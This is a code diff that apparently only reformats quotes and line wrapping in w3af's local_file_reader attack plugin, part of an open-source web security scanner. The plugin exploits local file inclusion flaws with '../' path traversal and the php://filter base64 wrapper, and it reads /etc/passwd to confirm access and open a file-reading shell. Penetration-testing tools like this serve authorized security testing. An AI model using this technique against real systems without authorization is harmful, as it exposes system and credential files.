@@ -19,6 +19,7 @@ along with w3af; if not, write to the Free Software
 Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 """
+
 import base64
 import copy
 import threading
@@ -28,8 +29,7 @@ import w3af.core.controllers.output_manager as om
 from w3af.core.data.kb.read_shell import ReadShell
 from w3af.core.controllers.plugins.attack_plugin import AttackPlugin
 from w3af.core.controllers.misc.fuzzy_string_cmp import fuzzy_equal
-from w3af.core.controllers.exceptions import (BaseFrameworkException,
-                                              BodyCutException)
+from w3af.core.controllers.exceptions import BaseFrameworkException, BodyCutException
 
 from w3af.plugins.attack.payloads.decorators.read_decorator import read_debug
 
@@ -47,7 +47,7 @@ class local_file_reader(AttackPlugin):
         """
         :return: The type of exploit, SHELL, PROXY, etc.
         """
-        return 'shell'
+        return "shell"
 
     def get_kb_location(self):
         """
@@ -59,11 +59,11 @@ class local_file_reader(AttackPlugin):
 
         Then the exploit plugin that exploits os_commanding
         (attack.os_commanding) should return ['os_commanding',] in this method.
-        
+
         If there is more than one location the implementation should return
         ['a', 'b', ..., 'n']
         """
-        return ['lfi']
+        return ["lfi"]
 
     def _generate_shell(self, vuln_obj):
         """
@@ -73,10 +73,13 @@ class local_file_reader(AttackPlugin):
         """
         if self._verify_vuln(vuln_obj):
 
-            shell_obj = FileReaderShell(vuln_obj, self._uri_opener,
-                                        self.worker_pool,
-                                        self._header_length,
-                                        self._footer_length)
+            shell_obj = FileReaderShell(
+                vuln_obj,
+                self._uri_opener,
+                self.worker_pool,
+                self._header_length,
+                self._footer_length,
+            )
 
             return shell_obj
 
@@ -99,14 +102,14 @@ class local_file_reader(AttackPlugin):
         """
         Try to define the cut with a relaxed algorithm based on two different
         http requests.
-        
+
         :return : True if vuln can be exploited and the information extracted
         """
         orig_mutant = vuln_obj.get_mutant()
 
         # Prepare the second request, with a non existent file
         copy_mutant = copy.deepcopy(orig_mutant)
-        copy_mutant.set_token_value('/do/not/exist')
+        copy_mutant.set_token_value("/do/not/exist")
 
         try:
             response_a = self._uri_opener.send_mutant(orig_mutant)
@@ -115,22 +118,22 @@ class local_file_reader(AttackPlugin):
             om.out.error(str(e))
             return False
         else:
-            if self._guess_cut(response_a.get_body(),
-                               response_b.get_body(),
-                               vuln_obj['file_pattern']):
+            if self._guess_cut(
+                response_a.get_body(), response_b.get_body(), vuln_obj["file_pattern"]
+            ):
                 return True
             else:
-                return False    
-    
+                return False
+
     def _strict_with_etc_passwd(self, vuln_obj):
         """
         Try to define the cut with a very strict algorithm based on the
         /etc/passwd file format.
-        
+
         :return : True if vuln can be exploited and the information extracted
         """
         # Check if we can apply a stricter extraction method
-        if not 'passwd' in vuln_obj.get_mutant().get_token_value():
+        if not "passwd" in vuln_obj.get_mutant().get_token_value():
             return False
 
         mutant = vuln_obj.get_mutant()
@@ -143,8 +146,9 @@ class local_file_reader(AttackPlugin):
             return False
 
         try:
-            cut = self._define_cut_from_etc_passwd(response_a.get_body(),
-                                                   response_b.get_body())
+            cut = self._define_cut_from_etc_passwd(
+                response_a.get_body(), response_b.get_body()
+            )
         except ValueError as ve:
             om.out.error(str(ve))
             return False
@@ -173,10 +177,11 @@ class local_file_reader(AttackPlugin):
         you will end up reading the result of the script interpretation.
         """
 
-PERMISSION_DENIED = 'Permission denied.'
-NO_SUCH_FILE = 'No such file or directory.'
-READ_DIRECTORY = 'Cannot cat a directory.'
-FAILED_STREAM = 'Failed to open stream.'
+
+PERMISSION_DENIED = "Permission denied."
+NO_SUCH_FILE = "No such file or directory."
+READ_DIRECTORY = "Cannot cat a directory."
+FAILED_STREAM = "Failed to open stream."
 
 
 class FileReaderShell(ReadShell):
@@ -186,7 +191,7 @@ class FileReaderShell(ReadShell):
     :author: Andres Riancho (andres.riancho@gmail.com)
     """
 
-    NOT_EXISTS_FILE = 'not_exist0.txt'
+    NOT_EXISTS_FILE = "not_exist0.txt"
 
     def __init__(self, vuln, url_opener, worker_pool, header_len, footer_len):
         super(FileReaderShell, self).__init__(vuln, url_opener, worker_pool)
@@ -224,24 +229,25 @@ class FileReaderShell(ReadShell):
         """
         # Error handling
         app_error = self.read(self.NOT_EXISTS_FILE)
-        self._file_not_found_str = app_error.replace(self.NOT_EXISTS_FILE, '')
+        self._file_not_found_str = app_error.replace(self.NOT_EXISTS_FILE, "")
 
         # PHP wrapper configuration
         self._use_base64_wrapper = False
         try:
-            #FIXME: This only works in Linux!
-            response = self._read_with_b64('/etc/passwd')
+            # FIXME: This only works in Linux!
+            response = self._read_with_b64("/etc/passwd")
         except Exception as e:
-            msg = 'Not using base64 wrapper for reading because of ' \
-                  'exception: "%s"'
+            msg = "Not using base64 wrapper for reading because of " 'exception: "%s"'
             om.out.debug(msg % e)
         else:
-            if 'root:' in response or '/bin/' in response:
-                om.out.debug('Using base64 wrapper for reading.')
+            if "root:" in response or "/bin/" in response:
+                om.out.debug("Using base64 wrapper for reading.")
                 self._use_base64_wrapper = True
             else:
-                msg = 'Not using base64 wrapper for reading because response' \
-                      ' did not match "root:" or "/bin/".'
+                msg = (
+                    "Not using base64 wrapper for reading because response"
+                    ' did not match "root:" or "/bin/".'
+                )
                 om.out.debug(msg)
 
     @read_debug
@@ -266,8 +272,8 @@ class FileReaderShell(ReadShell):
 
     def _read_with_b64(self, filename):
         # TODO: Review this hack, does it work every time? What about null bytes?
-        filename = '../' * 15 + filename
-        filename = 'php://filter/convert.base64-encode/resource=' + filename
+        filename = "../" * 15 + filename
+        filename = "php://filter/convert.base64-encode/resource=" + filename
 
         filtered_response = self._read_utils(filename)
 
@@ -278,7 +284,7 @@ class FileReaderShell(ReadShell):
 
     def _read_basic(self, filename):
         # TODO: Review this hack, does it work every time? What about null bytes?
-        filename = '../' * 15 + filename
+        filename = "../" * 15 + filename
         filtered_response = self._read_utils(filename)
         return filtered_response
 
@@ -299,14 +305,15 @@ class FileReaderShell(ReadShell):
         try:
             cut_response = self._cut(response.get_body())
         except BodyCutException as bce:
-            issue = 'https://github.com/andresriancho/w3af/issues/5139'
+            issue = "https://github.com/andresriancho/w3af/issues/5139"
 
-            msg = ('Unexpected exception "%s" while trying to extract the file'
-                   ' content from the HTTP response body. Please try again.\n\n'
-
-                   'If the problem persists please add a comment with this'
-                   ' exception message and the steps to reproduce the issue'
-                   ' to %s\n\n')
+            msg = (
+                'Unexpected exception "%s" while trying to extract the file'
+                " content from the HTTP response body. Please try again.\n\n"
+                "If the problem persists please add a comment with this"
+                " exception message and the steps to reproduce the issue"
+                " to %s\n\n"
+            )
 
             return msg % (bce, issue)
 
@@ -318,27 +325,26 @@ class FileReaderShell(ReadShell):
         Filter out ugly php errors and print a simple "Permission denied"
         or "File not found"
         """
-        #print filename
+        # print filename
         error = None
 
-        if result.count('Permission denied'):
+        if result.count("Permission denied"):
             error = PERMISSION_DENIED
-        elif result.count('No such file or directory in'):
+        elif result.count("No such file or directory in"):
             error = NO_SUCH_FILE
-        elif result.count('Not a directory in'):
+        elif result.count("Not a directory in"):
             error = READ_DIRECTORY
-        elif result.count(': failed to open stream: '):
+        elif result.count(": failed to open stream: "):
             error = FAILED_STREAM
 
         elif self._file_not_found_str is not None:
             # The result string has the file I requested inside, so I'm going
             # to remove it.
-            clean_result = result.replace(filename, '')
+            clean_result = result.replace(filename, "")
 
             # Now I compare both strings, if they are VERY similar, then
             # filename is a non existing file.
-            if fuzzy_equal(self._file_not_found_str,
-                           clean_result, 0.9):
+            if fuzzy_equal(self._file_not_found_str, clean_result, 0.9):
                 error = NO_SUCH_FILE
 
         #
@@ -346,7 +352,7 @@ class FileReaderShell(ReadShell):
         #    Not the error itself.
         #
         if error is not None:
-            return ''
+            return ""
 
         return result
 
@@ -354,12 +360,17 @@ class FileReaderShell(ReadShell):
         """
         :return: The name of this shell.
         """
-        return 'local_file_reader'
+        return "local_file_reader"
 
     def __reduce__(self):
         """
         Need to define this method since the Shell class defines it, and we have
         a different number of __init__ parameters.
         """
-        return self.__class__, (self._vuln, None, None, self._header_length,
-                                self._footer_length)
+        return self.__class__, (
+            self._vuln,
+            None,
+            None,
+            self._header_length,
+            self._footer_length,
+        )
